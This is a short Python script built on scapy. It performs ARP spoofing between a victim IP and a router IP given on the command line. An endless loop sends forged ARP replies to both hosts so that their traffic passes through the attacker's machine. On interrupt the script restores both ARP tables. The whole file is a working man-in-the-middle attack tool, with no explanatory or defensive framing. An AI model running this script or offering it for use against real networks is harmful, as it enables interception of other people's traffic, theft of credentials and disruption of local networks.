import sys
from scapy.all import *

def arp_spoof(dest_ip, dest_mac, source_ip):
    packet = Ether(dst=dest_mac) / ARP(
        op="is-at",  
        psrc=source_ip,  
        pdst=dest_ip, 
        hwdst=dest_mac,  
    )
    sendp(packet, verbose=False)  


def arp_restore(dest_mac, dest_ip, source_mac, source_ip):
    packet = Ether(dst=dest_mac) / ARP(
        op="is-at", hwsrc=source_mac, hwdst=dest_mac, psrc=source_ip, pdst=dest_ip
    )
    sendp(packet, verbose=False)

def main():
  victim_ip = sys.argv[1]
  router_ip = sys.argv[2]

  victim_mac = getmacbyip(victim_ip)
  router_mac = getmacbyip(router_ip)

  try:
    print("The ARP attack has begun...")
    while True:
        arp_spoof(victim_ip, victim_mac, router_ip)
        arp_spoof(router_ip, router_mac, victim_ip)  

  except KeyboardInterrupt:
    print("Restoring the arp table...")
    arp_restore(victim_mac, victim_ip, router_mac, router_ip)
    arp_restore(router_mac, router_ip, victim_mac, victim_ip)

    quit()

main()
